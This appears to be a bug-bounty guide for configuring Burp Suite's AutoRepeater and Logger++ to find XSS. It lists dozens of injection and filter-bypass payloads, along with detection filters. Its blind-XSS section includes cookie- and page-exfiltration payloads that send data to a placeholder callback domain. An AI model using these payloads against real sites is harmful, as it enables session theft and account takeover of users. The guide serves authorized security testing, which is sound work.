# XSS Bug Bounty Automation - Logger++ & AutoRepeater

Complete configuration guide for finding Cross-Site Scripting (XSS) vulnerabilities using only Logger++ and AutoRepeater in Burp Suite.

---

## 📋 Table of Contents

- [AutoRepeater Configuration](#autorepeater-configuration)
  - [Canary Detection](#1-canary-detection)
  - [Reflected XSS Payloads](#2-reflected-xss-payloads)
  - [Blind XSS Payloads](#3-blind-xss-payloads)
  - [DOM XSS Payloads](#4-dom-xss-payloads)
  - [Special Context Payloads](#5-special-context-payloads)
  - [Bypass Payloads](#6-bypass-payloads)
- [Logger++ Filter Configuration](#logger-filter-configuration)
  - [Basic Detection Filters](#basic-detection-filters)
  - [Advanced Detection Filters](#advanced-detection-filters)
  - [Context-Specific Filters](#context-specific-filters)
- [Optimization Tips](#optimization-tips-for-bug-bounty)
- [Priority Testing Order](#priority-testing-order)
- [Quick Reference](#quick-reference-xss-contexts)

---

## 🔧 AutoRepeater Configuration

### 1. Canary Detection

#### Replace Configuration #1 - Basic Canary
```
Type: Request Param Value
Match: .*
Replace: <CANARY>
Which: Replace All
Regex Match: Enabled
```

#### Replace Configuration #2 - Unique Canary with Timestamp
```
Type: Request Param Value
Match: .*
Replace: XSS123CANARY456
Which: Replace All
Regex Match: Enabled
```

#### Replace Configuration #3 - Special Character Canary
```
Type: Request Param Value
Match: .*
Replace: '"><CANARY>
Which: Replace All
Regex Match: Enabled
```

---

### 2. Reflected XSS Payloads

#### Replace Configuration #4 - Basic Script Alert
```
Type: Request Param Value
Match: .*
Replace: <script>alert(1)</script>
Which: Replace All
Regex Match: Enabled
```

#### Replace Configuration #5 - Image Tag Onerror
```
Type: Request Param Value
Match: .*
Replace: <img src=x onerror=alert(1)>
Which: Replace All
Regex Match: Enabled
```

#### Replace Configuration #6 - SVG Onload
```
Type: Request Param Value
Match: .*
Replace: <svg onload=alert(1)>
Which: Replace All
Regex Match: Enabled
```

#### Replace Configuration #7 - Event Handler
```
Type: Request Param Value
Match: .*
Replace: " autofocus onfocus=alert(1) x="
Which: Replace All
Regex Match: Enabled
```

#### Replace Configuration #8 - Iframe SrcDoc
```
Type: Request Param Value
Match: .*
Replace: <iframe srcdoc="<script>alert(1)</script>">
Which: Replace All
Regex Match: Enabled
```

#### Replace Configuration #9 - Body Onload
```
Type: Request Param Value
Match: .*
Replace: <body onload=alert(1)>
Which: Replace All
Regex Match: Enabled
```

#### Replace Configuration #10 - Details/Summary
```
Type: Request Param Value
Match: .*
Replace: <details open ontoggle=alert(1)>
Which: Replace All
Regex Match: Enabled
```

---

### 3. Blind XSS Payloads

#### Replace Configuration #11 - Blind XSS with Image
```
Type: Request Param Value
Match: .*
Replace: "><img src='//YOUR-DOMAIN.com/xss'>
Which: Replace All
Regex Match: Enabled
```

#### Replace Configuration #12 - Blind XSS with Script Source
```
Type: Request Param Value
Match: .*
Replace: "><script src="//YOUR-DOMAIN.com/xss.js"></script>
Which: Replace All
Regex Match: Enabled
```

#### Replace Configuration #13 - Blind XSS with Fetch
```
Type: Request Param Value
Match: .*
Replace: <script>fetch('//YOUR-DOMAIN.com/?'+document.cookie)</script>
Which: Replace All
Regex Match: Enabled
```

#### Replace Configuration #14 - Blind XSS with Navigator.sendBeacon
```
Type: Request Param Value
Match: .*
Replace: <script>navigator.sendBeacon('//YOUR-DOMAIN.com',document.cookie)</script>
Which: Replace All
Regex Match: Enabled
```

---

### 4. DOM XSS Payloads

#### Replace Configuration #15 - JavaScript Protocol
```
Type: Request Param Value
Match: .*
Replace: javascript:alert(1)
Which: Replace All
Regex Match: Enabled
```

#### Replace Configuration #16 - Data Protocol
```
Type: Request Param Value
Match: .*
Replace: data:text/html,<script>alert(1)</script>
Which: Replace All
Regex Match: Enabled
```

#### Replace Configuration #17 - Location Hash
```
Type: Request Param Value
Match: .*
Replace: #<script>alert(1)</script>
Which: Replace All
Regex Match: Enabled
```

#### Replace Configuration #18 - Template Literals
```
Type: Request Param Value
Match: .*
Replace: ${alert(1)}
Which: Replace All
Regex Match: Enabled
```

---

### 5. Special Context Payloads

#### Replace Configuration #19 - Breaking Out of Script Tags
```
Type: Request Param Value
Match: .*
Replace: </script><img src=x onerror=alert(1)>
Which: Replace All
Regex Match: Enabled
```

#### Replace Configuration #20 - Breaking Out of Attribute
```
Type: Request Param Value
Match: .*
Replace: " onmouseover="alert(1)
Which: Replace All
Regex Match: Enabled
```

#### Replace Configuration #21 - Inside JavaScript String
```
Type: Request Param Value
Match: .*
Replace: '-alert(1)-'
Which: Replace All
Regex Match: Enabled
```

#### Replace Configuration #22 - Inside JavaScript Comment
```
Type: Request Param Value
Match: .*
Replace: */alert(1)/*
Which: Replace All
Regex Match: Enabled
```

#### Replace Configuration #23 - HTML Comment Escape
```
Type: Request Param Value
Match: .*
Replace: --><script>alert(1)</script><!--
Which: Replace All
Regex Match: Enabled
```

---

### 6. Bypass Payloads

#### Replace Configuration #24 - Case Variation
```
Type: Request Param Value
Match: .*
Replace: <ScRiPt>alert(1)</ScRiPt>
Which: Replace All
Regex Match: Enabled
```

#### Replace Configuration #25 - Encoding Bypass (HTML Entities)
```
Type: Request Param Value
Match: .*
Replace: <img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
Which: Replace All
Regex Match: Enabled
```

#### Replace Configuration #26 - Unicode Bypass
```
Type: Request Param Value
Match: .*
Replace: <script>\u0061\u006C\u0065\u0072\u0074(1)</script>
Which: Replace All
Regex Match: Enabled
```

#### Replace Configuration #27 - Double Tag Bypass
```
Type: Request Param Value
Match: .*
Replace: <script><script>alert(1)</script>
Which: Replace All
Regex Match: Enabled
```

#### Replace Configuration #28 - Nested Tag Bypass
```
Type: Request Param Value
Match: .*
Replace: <scr<script>ipt>alert(1)</scr</script>ipt>
Which: Replace All
Regex Match: Enabled
```

#### Replace Configuration #29 - Using Backticks
```
Type: Request Param Value
Match: .*
Replace: <img src=x onerror=alert`1`>
Which: Replace All
Regex Match: Enabled
```

#### Replace Configuration #30 - No Parentheses
```
Type: Request Param Value
Match: .*
Replace: <script>onerror=alert;throw 1</script>
Which: Replace All
Regex Match: Enabled
```

#### Replace Configuration #31 - Using eval with atob
```
Type: Request Param Value
Match: .*
Replace: <script>eval(atob('YWxlcnQoMSk='))</script>
Which: Replace All
Regex Match: Enabled
```

#### Replace Configuration #32 - Using String.fromCharCode
```
Type: Request Param Value
Match: .*
Replace: <script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
Which: Replace All
Regex Match: Enabled
```

---

### 7. POST Body & Header Replacements

#### Replace Configuration #33 - JSON Body Value
```
Type: Request Body
Match: ":\s*"([^"]*)"
Replace: ":"<script>alert(1)</script>"
Which: Replace All
Regex Match: Enabled
```

#### Replace Configuration #34 - Form Data
```
Type: Request Body
Match: =([^&]*)
Replace: =<img src=x onerror=alert(1)>
Which: Replace All
Regex Match: Enabled
```

#### Replace Configuration #35 - User-Agent Header
```
Type: Request Header
Match: User-Agent: .*
Replace: User-Agent: <script>alert(1)</script>
Which: Replace All
Regex Match: Enabled
```

#### Replace Configuration #36 - Referer Header
```
Type: Request Header
Match: Referer: .*
Replace: Referer: javascript:alert(1)
Which: Replace All
Regex Match: Enabled
```

#### Replace Configuration #37 - Cookie Values
```
Type: Request Header
Match: Cookie: (.*)
Replace: Cookie: xss=<script>alert(1)</script>
Which: Replace All
Regex Match: Enabled
```

---

## 🔍 Logger++ Filter Configuration

### Basic Detection Filters

#### Filter #1 - Canary Reflection
```
Response.Body CONTAINS "<CANARY>" || Response.Body CONTAINS "XSS123CANARY456"
```

#### Filter #2 - Script Tag Reflection
```
Response.Body CONTAINS "<script>" || Response.Body CONTAINS "</script>"
```

#### Filter #3 - Alert Function
```
Response.Body CONTAINS "alert(1)" || Response.Body CONTAINS "alert(document"
```

#### Filter #4 - Event Handlers
```
Response.Body CONTAINS "onerror=" || Response.Body CONTAINS "onload=" || Response.Body CONTAINS "onfocus=" || Response.Body CONTAINS "onmouseover="
```

#### Filter #5 - Image Tag with Onerror
```
Response.Body CONTAINS "<img" && Response.Body CONTAINS "onerror"
```

#### Filter #6 - SVG Tags
```
Response.Body CONTAINS "<svg" && Response.Body CONTAINS "onload"
```

#### Filter #7 - Iframe Tags
```
Response.Body CONTAINS "<iframe" && (Response.Body CONTAINS "srcdoc" || Response.Body CONTAINS "src=")
```

#### Filter #8 - JavaScript Protocol
```
Response.Body CONTAINS "javascript:" && (Response.Body CONTAINS "alert" || Response.Body CONTAINS "eval")
```

#### Filter #9 - Data Protocol
```
Response.Body CONTAINS "data:text/html" || Response.Body CONTAINS "data:image/svg+xml"
```

---

### Advanced Detection Filters

#### Filter #10 - Unescaped Quotes in Attributes
```
Response.Body CONTAINS "value=\"" && Response.Body CONTAINS "<CANARY>"
```

#### Filter #11 - Reflection in Script Context
```
Response.Body CONTAINS "<script>" && Response.Body CONTAINS "var" && Response.Body CONTAINS "<CANARY>"
```

#### Filter #12 - Reflection in Event Handler
```
(Response.Body CONTAINS "onclick=" || Response.Body CONTAINS "onerror=") && Response.Body CONTAINS "<CANARY>"
```

#### Filter #13 - HTML Comment Escape
```
Response.Body CONTAINS "<!--" && Response.Body CONTAINS "-->" && Response.Body CONTAINS "<CANARY>"
```

#### Filter #14 - Successful XSS (No Encoding)
```
Response.Body CONTAINS "<script>alert(1)</script>" && Response.Status == 200
```

#### Filter #15 - Encoded Reflection (Potential Bypass)
```
Response.Body CONTAINS "&lt;script&gt;" || Response.Body CONTAINS "&lt;img"
```

#### Filter #16 - Template Literal Reflection
```
Response.Body CONTAINS "${" && Response.Body CONTAINS "}"
```

#### Filter #17 - JavaScript String Escape
```
Response.Body CONTAINS "var" && Response.Body CONTAINS "'" && Response.Body CONTAINS "<CANARY>"
```

#### Filter #18 - URL Parameter in JavaScript
```
Response.Body CONTAINS "location.href" || Response.Body CONTAINS "window.location" || Response.Body CONTAINS "document.URL"
```

---

### Context-Specific Filters

#### Filter #19 - Input Value Attribute
```
Response.Body CONTAINS "<input" && Response.Body CONTAINS "value=" && Response.Body CONTAINS "<CANARY>"
```

#### Filter #20 - Textarea Content
```
Response.Body CONTAINS "<textarea" && Response.Body CONTAINS "<CANARY>"
```

#### Filter #21 - Title Tag Reflection
```
Response.Body CONTAINS "<title>" && Response.Body CONTAINS "<CANARY>"
```

#### Filter #22 - Meta Tag Reflection
```
Response.Body CONTAINS "<meta" && Response.Body CONTAINS "content=" && Response.Body CONTAINS "<CANARY>"
```

#### Filter #23 - Hidden Input XSS
```
Response.Body CONTAINS "<input type=\"hidden\"" && Response.Body CONTAINS "popover"
```

#### Filter #24 - Anchor Href Attribute
```
Response.Body CONTAINS "<a href=" && (Response.Body CONTAINS "javascript:" || Response.Body CONTAINS "<CANARY>")
```

#### Filter #25 - Form Action Attribute
```
Response.Body CONTAINS "<form" && Response.Body CONTAINS "action=" && Response.Body CONTAINS "<CANARY>"
```

---

## 💡 Optimization Tips for Bug Bounty

### 1. Target High-Value Endpoints

Focus AutoRepeater on:

- ✅ Search functionality
- ✅ Comment/feedback forms
- ✅ Profile/bio fields
- ✅ Error pages
- ✅ 404 pages
- ✅ URL parameters reflected in response
- ✅ File upload (filename parameters)
- ✅ Email/notification preview
- ✅ Admin panels
- ✅ Login/registration forms

### 2. Logger++ Export Configuration

Optimize your Logger++ setup:

- **Columns to include**: URL, Method, Status, Request (partial), Response Body (partial), Length
- **Auto-export**: Enable for quick review
- **Color coding**: 
  - Red: Confirmed XSS
  - Orange: High probability XSS
  - Yellow: Canary reflection
  - Green: Encoded/escaped

### 3. Staged Testing Approach
```
Phase 1: Canary injection → Identify reflection points
    ↓
Phase 2: Context analysis → Determine injection context (HTML, JS, attribute)
    ↓
Phase 3: Payload crafting → Test context-specific payloads
    ↓
Phase 4: Bypass techniques → If filtered, apply encoding/obfuscation
    ↓
Phase 5: Exploitation → Confirm execution & document POC
```

### 4. False Positive Reduction

Add these exclusion filters to Logger++:
```
!(Response.Body CONTAINS "&lt;script&gt;" && !(Response.Body CONTAINS "<script>"))
!(Response.Body CONTAINS "charset=")
!(Response.Body CONTAINS "Content-Type: application/json")
```

### 5. Quick Win Patterns

Look for these high-value patterns in Logger++:
```
Request.Path CONTAINS "search" || Request.Path CONTAINS "query" || Request.Path CONTAINS "q=" || Request.Path CONTAINS "keyword" || Request.Path CONTAINS "name=" || Request.Path CONTAINS "comment" || Request.Path CONTAINS "message"
```

### 6. DOM XSS Detection Strategy

For DOM XSS, monitor these JavaScript sinks in responses:
```
Response.Body CONTAINS "innerHTML" || Response.Body CONTAINS "document.write" || Response.Body CONTAINS "eval(" || Response.Body CONTAINS "setTimeout" || Response.Body CONTAINS "setInterval" || Response.Body CONTAINS "location.href" || Response.Body CONTAINS "location.replace"
```

---

## 🎯 Priority Testing Order

### 1. **GET Parameters** (Highest Priority)
- Most common XSS vector
- Easy to test and exploit
- Often reflected in multiple contexts

### 2. **POST Data**
- Form submissions
- JSON payloads
- XML data

### 3. **Custom Headers**
- User-Agent
- Referer
- X-Forwarded-For
- X-Original-URL
- Accept-Language

### 4. **Cookie Values**
- Session cookies
- Preference cookies
- Tracking cookies

### 5. **File Upload**
- Filename parameters
- SVG file uploads
- HTML file uploads

### 6. **Path Parameters**
- RESTful API paths
- Route parameters

---

## 📊 Quick Reference: XSS Contexts

### HTML Context

| Context | Payload Example | Detection |
|---------|----------------|-----------|
| Plain HTML | `<script>alert(1)</script>` | Tags visible in source |
| Inside Tag | `" onmouseover="alert(1)` | Attribute reflection |
| Inside Comment | `--><script>alert(1)</script><!--` | Comment markers |

### JavaScript Context

| Context | Payload Example | Detection |
|---------|----------------|-----------|
| Inside String | `'-alert(1)-'` | String delimiters |
| Inside Script | `</script><img src=x onerror=alert(1)>` | Script tags |
| Template Literal | `${alert(1)}` | Backticks present |

### Attribute Context

| Context | Payload Example | Detection |
|---------|----------------|-----------|
| href | `javascript:alert(1)` | href attribute |
| src | `<img src=x onerror=alert(1)>` | src attribute |
| Event handler | `" onfocus=alert(1) autofocus="` | Event attributes |

---

## 🚀 Quick Start Guide

### 1. Install Extensions
- Install AutoRepeater in Burp Suite
- Install Logger++ in Burp Suite

### 2. Configure AutoRepeater
- Start with Canary detection (#1-#3)
- Add basic payloads (#4-#10)
- Add bypass payloads (#24-#32)
- Enable 3-5 replacements at a time

### 3. Configure Logger++
- Add canary reflection filter (#1)
- Add basic detection filters (#2-#9)
- Add context-specific filters (#19-#25)
- Enable color coding

### 4. Start Testing
- Browse target application normally
- Focus on input fields and parameters
- Monitor Logger++ for reflections
- Analyze context of reflection

### 5. Investigate Findings
- Check if canary is reflected
- Identify injection context
- Test context-specific payloads
- Attempt bypass techniques
- Document POC with screenshots

---

## 🔥 Advanced Blind XSS Setup

### Blind XSS Payload Template

Replace `YOUR-DOMAIN.com` with your callback domain:
```javascript
// Basic callback
">

// Cookie exfiltration
fetch('//YOUR-DOMAIN.com/?'+document.cookie)

// Full page exfiltration

var xhr=new XMLHttpRequest();
xhr.open('POST','//YOUR-DOMAIN.com',true);
xhr.send(document.documentElement.outerHTML);


// Image-based (works everywhere)
">
```

### Logger++ Filter for Outbound Requests

Monitor your callback domain:
```
Request.Host CONTAINS "YOUR-DOMAIN.com"
```

---

## ⚠️ Important Notes

- **Always test on authorized targets only**
- **Start with safe detection payloads** (canaries, benign scripts)
- **Escalate gradually** to avoid triggering WAF/IDS
- **Document all findings** with:
  - Request/Response
  - Screenshot of execution
  - Impact description
  - Remediation advice
- **Report responsibly** through proper disclosure channels
- **Blind XSS may take time** - be patient and monitor callbacks

---

## 🎓 XSS Context Quick Identification

### When you find reflection, ask:

1. **Where is it reflected?**
   - HTML body? → Try `<script>alert(1)</script>`
   - Inside tag attribute? → Try `" onmouseover="alert(1)`
   - Inside `<script>` tag? → Try `'-alert(1)-'`
   - Inside HTML comment? → Try `--><script>alert(1)</script><!--`

2. **Is it filtered?**
   - `<script>` blocked? → Try `<img src=x onerror=alert(1)>`
   - Quotes filtered? → Try template literals or events
   - All tags blocked? → Try JavaScript protocol `javascript:alert(1)`

3. **Is it encoded?**
   - HTML encoded? → Try double encoding or look for decode points
   - URL encoded? → Try double encoding
   - Unicode escaped? → May execute in some contexts

---
